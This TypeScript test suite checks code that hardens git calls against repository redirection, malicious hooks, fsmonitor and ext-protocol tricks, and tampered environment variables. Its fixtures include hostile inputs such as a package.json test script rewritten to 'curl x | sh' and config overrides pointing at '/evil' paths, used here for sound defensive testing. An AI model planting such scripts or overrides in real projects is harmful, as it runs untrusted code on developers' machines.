/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { formatBuildEntryDiff, gitSubcommand, hostGitArgs, hostGitArgsError, hostGitEnv, hostGitLayoutError, isRemoteGitCommand } from '../../common/hostGit.js';

suite('HostGit arguments and repository check', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('the guards come first and always; ssh and system credential helpers only for remotes', () => {
		assert.deepStrictEqual(hostGitArgs(['status'], { hooksPath: '/dev/null', sshCommand: 'ssh', credentialHelpers: ['osxkeychain'] }),
			['-c', 'core.fsmonitor=false', '-c', 'protocol.ext.allow=never', '-c', 'core.hooksPath=/dev/null', 'status']);
		assert.deepStrictEqual(hostGitArgs(['-c', 'credential.interactive=never', 'push', 'origin'], { hooksPath: undefined, sshCommand: 'ssh -i k', credentialHelpers: ['osxkeychain'] }),
			['-c', 'core.fsmonitor=false', '-c', 'protocol.ext.allow=never', '-c', 'core.sshCommand=ssh -i k', '-c', 'credential.helper=osxkeychain', '-c', 'credential.interactive=never', 'push', 'origin']);
		assert.strictEqual(gitSubcommand(['--no-pager', '-c', 'a=b', 'log', '-n1']), 'log');
		assert.ok(isRemoteGitCommand(['fetch']) && !isRemoteGitCommand(['status']) && !isRemoteGitCommand(['-c', 'fetch=x', 'log']));
	});

	test('a caller cannot redirect the repository or switch a guard off', () => {
		for (const args of [['-C', '/x', 'status'], ['--git-dir=/x', 'status'], ['--work-tree', '/x', 'status'], ['-c', 'core.fsmonitor=/x', 'status'], ['-c', 'core.hooksPath=/x', 'commit'], ['-c', 'protocol.ext.allow=always', 'fetch'], ['-c', 'Core.SshCommand=x', 'push'], ['-c', 'include.path=/x', 'status']]) {
			assert.ok(hostGitArgsError(args), args.join(' '));
		}
		for (const args of [['status'], ['-c', 'core.quotepath=off', 'diff'], ['--no-optional-locks', 'status'], ['log', '-C'], ['commit', '-m', '-C']]) {
			assert.strictEqual(hostGitArgsError(args), undefined, args.join(' '));
		}
	});

	test('the environment drops redirects, keeps the caller\'s temp index, and disables system config off Windows', () => {
		const env = hostGitEnv({ PATH: '/usr/bin', GIT_DIR: '/evil', GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'core.fsmonitor', GIT_CONFIG_VALUE_0: '/evil' }, { GIT_INDEX_FILE: '/tmp/i', GIT_COMMON_DIR: '/evil' }, 'darwin');
		assert.deepStrictEqual(env, { PATH: '/usr/bin', GIT_INDEX_FILE: '/tmp/i', GIT_NO_REPLACE_OBJECTS: '1', GIT_TERMINAL_PROMPT: '0', GIT_CONFIG_NOSYSTEM: '1' });
		assert.strictEqual(hostGitEnv({}, undefined, 'win32').GIT_CONFIG_NOSYSTEM, undefined);
	});

	test('only layouts git makes on its own pass', () => {
		const ok = [
			{ toplevel: '/r', gitDir: '/r/.git', commonDir: '/r/.git' },
			{ toplevel: '/wt', gitDir: '/r/.git/worktrees/wt', commonDir: '/r/.git' },
			{ toplevel: '/r/sub', gitDir: '/r/.git/modules/sub', commonDir: '/r/.git/modules/sub' },
			{ gitDir: '/bare.git', commonDir: '/bare.git' },
		];
		for (const layout of ok) {
			assert.strictEqual(hostGitLayoutError(layout, undefined, false), undefined, JSON.stringify(layout));
		}
		const bad = [
			{ toplevel: '/r', gitDir: '/r/.git', commonDir: '/tmp/evil' },
			{ toplevel: '/wt', gitDir: '/r/.git/worktrees/wt', commonDir: '/tmp/evil' },
			{ toplevel: '/r', gitDir: '/tmp/evil', commonDir: '/tmp/evil' },
			{ toplevel: '/wt', gitDir: '/tmp/evil/worktrees/wt', commonDir: '/tmp/evil/x' },
		];
		for (const layout of bad) {
			assert.ok(hostGitLayoutError(layout, undefined, false), JSON.stringify(layout));
		}
		assert.ok(hostGitLayoutError({ toplevel: '/wt', gitDir: '/elsewhere/.git/worktrees/wt', commonDir: '/elsewhere/.git' }, ['/wt', '/r/.git'], false), 'outside the expected roots');
		assert.strictEqual(hostGitLayoutError({ toplevel: '/Wt', gitDir: '/R/.git/worktrees/wt', commonDir: '/r/.git' }, ['/wt', '/r/.git'], true), undefined, 'case-insensitive volumes');
	});

	test('the review shows only what changed in each file', () => {
		const text = formatBuildEntryDiff([
			{ path: '/r/package.json', group: 'build', kind: 'changed', before: '{\n\t"test": "jest"\n}', after: '{\n\t"test": "curl x | sh"\n}' },
			{ path: '/r/.git/hooks/pre-commit', group: 'git', kind: 'added', after: 'evil' },
		]);
		assert.strictEqual(text, 'Changed: /r/package.json\n- \t"test": "jest"\n+ \t"test": "curl x | sh"\nAdded: /r/.git/hooks/pre-commit\n+ evil');
	});
});
